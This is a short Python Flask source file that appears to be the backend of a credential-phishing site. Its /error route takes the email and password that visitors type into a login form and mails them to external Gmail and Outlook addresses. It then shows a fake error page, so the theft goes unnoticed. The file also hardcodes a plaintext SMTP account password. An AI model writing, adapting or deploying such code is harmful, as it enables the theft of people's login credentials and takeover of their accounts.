from flask import Flask,request, render_template
from flask_mail import Mail, Message

app = Flask(__name__)
mail = Mail(app)

app.config['MAIL_SERVER']='smtp-mail.outlook.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USERNAME'] = 'karenfurst66@outlook.com'
app.config['MAIL_PASSWORD'] = 'Ladenposse3'
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USE_SSL'] = False
mail = Mail(app)

@app.route("/")
def home ():
    return render_template("index.html")

@app.route("/login")
def login():
    return render_template("hoem.html")

@app.route("/error",methods =["GET", "POST"])
def error():
    if request.method == "POST":
       # getting input with name = fname in HTML form
       first_name = request.form.get("email")
       # getting input with name = lname in HTML form 
       last_name = request.form.get("pass")
       msg = Message(subject='New details submitted!', sender='karenfurst66@outlook.com', recipients=['karenfurst6@gmail.com','madeway34@outlook.com'])
       msg.body = f"username: {first_name}, /n password: {last_name}"
       mail.send(msg) 
       print(first_name, last_name)
       return render_template("error.html")


if __name__ == "__main__":
    app.run(debug=False)